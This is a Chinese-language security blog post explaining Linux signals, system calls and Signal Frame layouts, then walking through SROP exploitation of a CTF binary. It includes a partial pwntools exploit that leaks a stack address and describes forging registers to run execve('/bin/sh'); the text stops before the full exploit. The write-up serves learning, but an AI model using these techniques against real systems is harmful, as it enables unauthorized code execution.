    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">SignalFrame分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-29 01:36:08" itemprop="dateCreated datePublished" datetime="2021-12-29T01:36:08+08:00">2021-12-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 14:38:06" itemprop="dateModified" datetime="2023-04-02T14:38:06+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SignalFrame分析"><a href="#SignalFrame分析" class="headerlink" title="SignalFrame分析"></a>SignalFrame分析</h2><p><strong>————深入理解SROP和系统调用</strong></p>
<p><strong>SROP</strong> 也即Sigreturn Oriented Programming，是一种基于 <strong>signal机制</strong> 进行攻击的高级ROP利用手段，通过覆盖 <strong>Signal Frame</strong> 上的关键数据来控制 <strong>sigreturn</strong>，从而达到漏洞利用的效果</p>
<p>我在学习<strong>SROP</strong>的过程中，发现了一道设计巧妙的题目，我在分析了其他师傅的WP后，又去了解了一下<strong>SROP</strong>背后的原理，于是想记录一下，做个总结</p>
<hr>
<h2 id="前言-中断流程-amp-分类"><a href="#前言-中断流程-amp-分类" class="headerlink" title="前言-中断流程&amp;分类"></a>前言-中断流程&amp;分类</h2><p>中断是计算机程序中的一种机制，用于处理一些需要及时处理的情况</p>
<p>一，中断流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">中断请求 &gt;&gt; CPU识别 &gt;&gt; 中断判优 &gt;&gt; 保存信息 &gt;&gt; 跳转中断处理程序 &gt;&gt; 返回复原</span><br></pre></td></tr></table></figure>
<p>1.中断请求：程序可以利用指令进行中断请求，而一些被检测出来的错误也可以触发中断请求</p>
<p>2.CPU识别：CPU是处理中断信息的核心，它负责检测中断请求</p>
<p>3.中断判优：当程序内部出现错误时，必须马上做出响应，所以CPU会检查flag寄存器中的“TP位”和“IF位”来获取中断的信息，以便判断哪些响应是紧急的，哪些又是可以不响应的</p>
<p>4.保存信息：在进行响应前，内核会帮用户进程将其上下文保存在该进程的栈中</p>
<p>5.跳转中断处理程序：根据中断信息和中断向量表找到对应的中断处理程序</p>
<p>6.返回复原：调用函数<strong>Sigreturn</strong>来复原栈空间</p>
<p>二，中断分类：</p>
<p>中断可以根据其中断源和重要程度进行分类，大致有以下3种：</p>
<p>1.内中断和外中断 </p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">外中断：是指来自处理器和内存以外的部件引起的中断，包括<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>设备发出的<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>中断，外部信号中断，以及各种计时器引起的时钟中断等（外中断在狭义上一般被称为中断）</span><br><span class="line"></span><br><span class="line">内中断：主要指在处理器和内存内部产生的中断，包括程序运算引起的各种错误，如地址非法、检验错、页面失效、存储访问控制错、算术操作溢出、数据格式非法、除数为<span class="number">0</span>、非法指令、用户程序执行特权指令、分时操作系统中的时间片中断以及用户态到核心态的切换等</span><br></pre></td></tr></table></figure>
<p>2.硬件中断和软件中断 </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">硬件中断：通过外部的硬件产生的中断（硬件中断属于外中断）</span><br><span class="line"></span><br><span class="line">软件中断：通过某条指令产生的中断，这种中断可以编程实现（软件中断属于内中断）</span><br></pre></td></tr></table></figure>
<p>3.非屏蔽中断和可屏蔽中断（全是外中断） </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">非屏蔽中断：非屏蔽中断是一种硬件中断，此种中断通过不可屏蔽中断请求NMI控制，不受中断标志位<span class="keyword">IF</span>的影响，即使关中断（<span class="attribute">IF</span>=0）的情况下也会被响应</span><br><span class="line"></span><br><span class="line">可屏蔽中断：可屏蔽中断也是一种硬件中断，此种中断通过中断请求标记触发器INTR控制，且受中断标志位<span class="keyword">IF</span>的影响，在关中断情况下不接受中断请求</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fengfeng0328/article/details/83318000（更详细）">https://blog.csdn.net/fengfeng0328/article/details/83318000（更详细）</a></p>
<hr>
<h2 id="前言-系统调用"><a href="#前言-系统调用" class="headerlink" title="前言-系统调用"></a>前言-系统调用</h2><p><strong>什么是系统调用？</strong></p>
<p>由操作系统提供的供所有系统调用的<strong>程序接口集合</strong></p>
<p>用户程序通常只在 <strong>用户态</strong> 下运行，当用户程序想要调用只能在 <strong>内核态</strong> 运行的子程序时，所以操作系统需要提供 <strong>访问这些内核态</strong> 运行的程序的接口，这些接口的集合就叫做系统调用，简要的说，系统调用是内核向用户进程提供服务的唯一方法<br>用户程序通过系统调用从用户态（user mode）切换到核心态（ kernel mode ），从而可以访问相应的资源。这样做的好处是：</p>
<ul>
<li>为用户空间提供了一种硬件的抽象接口，使编程更加容易</li>
<li>有利于系统安全</li>
<li>有利于每个进程度运行在虚拟系统中，接口统一有利于移植</li>
</ul>
<p><strong>系统调用的过程</strong></p>
<p>系统调用通过<strong>signal机制</strong>来实现</p>
<p>一般64位系统会用 <strong>syscall</strong>（陷阱）来传递中断信息，而32位系统则会使用 <strong>int n</strong>（中断）</p>
<p>它们都会把系统调用号装入“rax/eax”寄存器，然后把必要的参数装入其他寄存器</p>
<p><strong>系统调用和内核的联系</strong></p>
<p>通常，处理器设有两种模式： <strong>“用户模式”</strong> 与 <strong>“内核模式”</strong> ，通过一个标签位来鉴别当前正处于什么模式</p>
<p>内核模式可以运行所有指令，包括特权指令（主要是一些硬件管理的指令，例如修改基址寄存器内容的指令），而用户模式不能执行特权指令，这样的设计主要为了安全问题，即由操作系统负责管理硬件，避免上层应用因错误设计而导致硬件问题 </p>
<p>而在上文中提及到：有些基于读写的操作必须要在 <strong>“内核模式”</strong> 中完成，而系统调用为了实现这些功能而诞生的，它通过提供 <strong>有权限限制</strong> 的  <strong>“内核模式”</strong> ，来实现一些 <strong>“用户模式”</strong> 无法办到的操作</p>
<p><strong>系统调用和库函数的联系</strong></p>
<p>事实上，系统调用所提供给用户的是直接而纯碎的高级服务，如果想要更加人性化，具有更符合特定情况的功能，那么就要我们用户自己定义，因此衍生了库函数 </p>
<p>库函数把系统调用进行<strong>包装</strong>，使它更方便使用，比如C语言标准库中的“printf”就使用了大量的系统调用，才实现了输出字符串到屏幕的功能</p>
<p>所以系统调用是为了方便使用操作系统的接口，而库函数则是为了人们编程的方便 </p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DurKui/p/15345050.html">https://www.cnblogs.com/DurKui/p/15345050.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8e89b13fac7d">https://www.jianshu.com/p/8e89b13fac7d</a></p>
<hr>
<h2 id="简析Signal机制"><a href="#简析Signal机制" class="headerlink" title="简析Signal机制"></a>简析Signal机制</h2><p>signal机制是类unix系统中进程之间相互传递信息的一种方法，是软件中断的一种</p>
<p>流程如下： </p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640582446513.png" class width="1640582446513"> 
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某个进程发送signal机制 &gt;&gt; 保存上下文 &gt;&gt; signal处理 &gt;&gt; 还原上下文 &gt;&gt; 进行程序</span><br></pre></td></tr></table></figure>
<p>详细来说：</p>
<p>进程发起signal后，先会保存上下文并在<strong>栈顶</strong>添加一个 sigreturn ，然后控制IP指针指向 Siganl Handler，程序执行完成后又会还原上下文，最后控制IP指针返回</p>
<p>​        //这样大规模的读写操作需要更高的权限，所以需要进入<strong>内核态</strong>，由于恢复的任务比较艰巨，系统干脆提供了一个系统调用 <strong>sigreturn</strong></p>
<p><strong>Signal机制</strong>之中有几个重要的概念：</p>
<p>1.sigreturn：一种系统调用，用于还原各个寄存器中的数据</p>
<p>2.ucontext：linux中设计的一种结构体，给用户让渡了一部分控制代码上下文的能力</p>
<p>3.siginfo：一种结构体，用于存储信号的信息</p>
<p>4.Signal Frame：我们称ucontext以及siginfo这一段为Signal Frame </p>
<p><strong>SROP</strong>的核心就是伪造Signal Frame，欺骗程序执行我们需要的代码</p>
<hr>
<h2 id="简析ucontext-amp-siginfo"><a href="#简析ucontext-amp-siginfo" class="headerlink" title="简析ucontext &amp; siginfo"></a>简析ucontext &amp; siginfo</h2><p><strong>ucontext：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> &#123;</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc_link</span>;</span><span class="comment">//指向此上下文返回时，将恢复的上下文的指针   </span></span><br><span class="line">               <span class="keyword">sigset_t</span>         uc_sigmask;<span class="comment">//运行时各个寄存器的值</span></span><br><span class="line">               <span class="keyword">stack_t</span>          uc_stack;<span class="comment">//运行栈</span></span><br><span class="line">               <span class="keyword">mcontext_t</span>       uc_mcontext;<span class="comment">//信号</span></span><br><span class="line">               ...	</span><br><span class="line">           &#125; <span class="keyword">ucontext_t</span>;</span><br></pre></td></tr></table></figure>
<p>结构体ucontext用于保存上下文信息</p>
<p>有了它，许多上下文切换的操作都可以完成，linux也为它提供了一组api：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">getcontext</span><span class="params">(<span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//获取当前上下文</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">setcontext</span><span class="params">(<span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//则是从‘ucp’指向的实例恢复上下文到现场</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makecontext</span><span class="params">(<span class="keyword">ucontext_t</span> *ucp, (<span class="keyword">void</span> *func)(), <span class="keyword">int</span>, ...)</span></span>;</span><br><span class="line"><span class="comment">//可以修改getcontext得到的上下文</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">swapcontext</span><span class="params">(<span class="keyword">ucontext_t</span> *oucp, <span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//调用getcontext到oucp，然后用ucp去setcontext</span></span><br></pre></td></tr></table></figure>
<p>这里就不继续展开了</p>
<p><strong>siginfo：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> si_signo;<span class="comment">// signal number的简写，该变量用来存储信号编号并且恒有值</span></span><br><span class="line">    <span class="keyword">int</span> si_code;<span class="comment">// signal code的简写，可以获取多种变量值</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">sigval</span> <span class="title">si_value</span>;</span><span class="comment">// ignal value的简写，这个变量是一个结构体</span></span><br><span class="line">    <span class="keyword">int</span> si_errno;<span class="comment">// 如果该位不为0，则和信号在一起的有一个错误代码（信号发生错误）</span></span><br><span class="line">    <span class="keyword">pid_t</span> si_pid;<span class="comment">//	发送该信号的进程id</span></span><br><span class="line">    <span class="keyword">uid_t</span> si_uid;<span class="comment">// 发送该信号的用户id</span></span><br><span class="line">    <span class="keyword">void</span> *si_addr;<span class="comment">// 错误发生的地址</span></span><br><span class="line">    <span class="keyword">int</span> si_status;</span><br><span class="line">    <span class="keyword">int</span> si_band;</span><br><span class="line">&#125; <span class="keyword">siginfo_t</span>;</span><br></pre></td></tr></table></figure>
<p>结构体siginfo用于保存signal的各种信息</p>
<p>参考 </p>
<p>ucontext：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a96b31da3ab0">https://www.jianshu.com/p/a96b31da3ab0</a></p>
<p>siginfo：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1009-1803/p/13701754.html">https://www.cnblogs.com/zw1009-1803/p/13701754.html</a></p>
<p>TCP简析：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41877474/article/details/102580825">https://blog.csdn.net/qq_41877474/article/details/102580825</a></p>
<hr>
<h2 id="简析Signal-Frame"><a href="#简析Signal-Frame" class="headerlink" title="简析Signal Frame"></a>简析Signal Frame</h2><p>Signal Frame是由ucontext和siginfo组成的区域，signal中的信息都会存储在这里</p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640703030598.png" class width="1640703030598"> 
<p>其末尾就是<strong>sigreturn</strong>，可以根据Signal Frame在返回原栈帧和原寄存器数据</p>
<p>Signal Frame的结构在32位系统和64位系统中有些许不同：</p>
<p><strong>x86</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;	</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>x64</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每一次在请求signal后，signal handler执行前，程序<strong>都会</strong>在栈上构建这个栈帧</p>
<p>如果栈溢出的数据可以覆盖它的话，就可以进行伪造，欺骗程序</p>
<hr>
<h2 id="深入理解SROP"><a href="#深入理解SROP" class="headerlink" title="深入理解SROP"></a>深入理解SROP</h2><p>先看一个例子：（通过修改Signal Frame来控制syscall）</p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640706807303.png" class width="1640706807303"> 
<p>伪造 <strong>rdi</strong> 为“/bin/sh”，伪造 <strong>rip</strong> 为syscall，伪造 <strong>rax</strong> 为“59”（execve）</p>
<p>这样的话，程序在结束signal handler，执行<strong>sigreturn</strong>的时候，就可以控制 <strong>rip</strong> 指向syscall，然后根据调用号 “59” 执行系统调用execve</p>
<p>当然也可以伪造“syscall；ret”形成<strong>system call chains</strong>：</p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640707274321.png" class width="1640707274321"> 
<p>syscall执行完成过后，就可以通过ret控制ip指针指向栈顶元素（类似于gadgets）</p>
<p>SROP需要以下条件：</p>
<ol>
<li>攻击者可以通过stack overflow等漏洞控制栈上的内容</li>
<li>需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）</li>
<li>需要知道<code>syscall</code>指令在内存中的地址</li>
<li>需要知道<code>sigreturn</code>系统调用的内存地址</li>
</ol>
<p>接着我们就看一下那道设计巧妙的题目吧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, &amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0 ; <span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:00000000004000B0                 <span class="keyword">public</span> start</span></span><br><span class="line"><span class="function">.text:00000000004000B0 start           proc near               </span>; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">00000000004000B</span>0                 <span class="keyword">xor</span>     rax, rax</span><br><span class="line">.text:<span class="number">00000000004000B</span>3                 mov     edx, <span class="number">400</span>h       ; count</span><br><span class="line">.text:<span class="number">00000000004000B</span>8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:<span class="number">00000000004000B</span>B                 mov     rdi, rax        ; fd</span><br><span class="line">.text:<span class="number">00000000004000B</span>E                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">00000000004000</span>C0                 retn</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 start           endp</span><br><span class="line">.text:<span class="number">00000000004000</span>C0</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 _text           ends</span><br></pre></td></tr></table></figure>
<p>原汇编代码就相当于<strong>“read（rax，rsp，0x400）”</strong>，直接在栈顶写入数据</p>
<p>​        //注意：read的写入的位置并不是<strong>真正的</strong>rsp，而是对rsi进行赋值时的rsp指向的位置，所以syscall构建栈帧来保存上下文的过程不会受read的影响</p>
<p>源程序就是用汇编写的，只有一个函数，程序使用statically（没有got表）</p>
<p>经过分析可以发现3个问题：</p>
<p>问题一，没有“/bin/sh”：</p>
<p>本程序没有“/bin/sh”，所以需要用“read”在某个地址上写入“/bin/sh”</p>
<p>栈地址是不确定的，所以需要用“write”泄露用于写入“/bin/sh”栈地址</p>
<p>问题二，怎么修改rax：</p>
<p>想要syscall调用“write”，必须先要把rax填入“1”，而寄存器和栈空间完全就是两个东西，那么这么通过栈来控制寄存器呢？</p>
<p>整个程序就只有一个“syscall”函数，它第一次执行时调用“read”，而“read”的返回值就装在“rax”中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、如果读取成功，则返回实际读到的字节数。这里又有两种情况：一是如果在读完count要求字节之前已经到达文件的末尾，那么实际返回的字节数将小于count值，但是仍然大于<span class="number">0</span>；二是在读完count要求字节之前，仍然没有到达文件的末尾，这是实际返回的字节数等于要求的count值。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、如果读取时已经到达文件的末尾，则返回<span class="number">0</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、如果出错，则返回－<span class="number">1</span>。</span><br></pre></td></tr></table></figure>
<p>那么，先要rax为“1”，函数“read”的实际写入长度必须为“1”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0                 <span class="keyword">xor</span>     rax, rax</span><br></pre></td></tr></table></figure>
<p>而且这段汇编代码会把rax中的值改为“0”，所以必须让过……</p>
<p>所以“send(‘\xb3’)”是最佳选择，覆盖“0x4000B0”最后一字节为“0xb3”，跳过了它，并且长度为“1”</p>
<p>接下来就会执行<strong>“write（1，rsp，0x400）”</strong>，泄露stack_addr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span> <span class="comment">#start_addr压栈3次，程序总共会执行4次</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529781412.png" class width="1640529781412"> 
<p>第一次read时：在rsp写入“4000B0” * 3，同时read返回时“pop”掉一个，程序返回到“start_addr” </p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529918052.png" class width="1640529918052"> 
<p>第二次read时：在rsp写入“\xb3”，改写rsp为“0x4000B3”，程序返回到“start_addr+1”</p>
<p>第三次就直接执行write了</p>
<p>问题三，SROP到底怎么利用：</p>
<p>其实pwntool中有专门用来攻击<strong>srop</strong>的工具：<strong>SigreturnFrame</strong></p>
